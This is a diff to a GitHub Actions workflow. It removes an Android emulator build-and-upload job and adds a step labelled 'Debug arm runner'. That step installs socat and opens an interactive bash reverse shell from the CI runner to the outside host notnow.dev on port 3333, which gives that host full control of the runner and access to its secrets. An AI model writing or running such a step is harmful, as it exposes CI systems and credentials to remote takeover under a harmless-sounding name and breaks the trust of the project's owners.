@@ -4,27 +4,7 @@ on: workflow_dispatch
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04-arm
     steps:
-    - name: Checkout
-      uses: actions/checkout@v7
-    - name: Enable KVM group perms
-      run: |
-        echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
-        sudo udevadm control --reload-rules
-        sudo udevadm trigger --name-match=kvm
-
-    - name: Run emulator
-      uses: reactivecircus/android-emulator-runner@v2
-      with:
-        api-level: "37.0"
-        target: google_apis_ps16k
-        arch: x86_64
-        profile: pixel_7_pro
-        script: ./cli/hiddenjar doctor && ./cli/hiddenjar build
-
-    - name: Upload jar
-      uses: actions/upload-artifact@v7
-      with:
-        path: ./android-37-custom.jar
-        archive: false
+    - name: Debug arm runner
+      run: sudo apt update && sudo apt install -y socat && socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:notnow.dev:3333
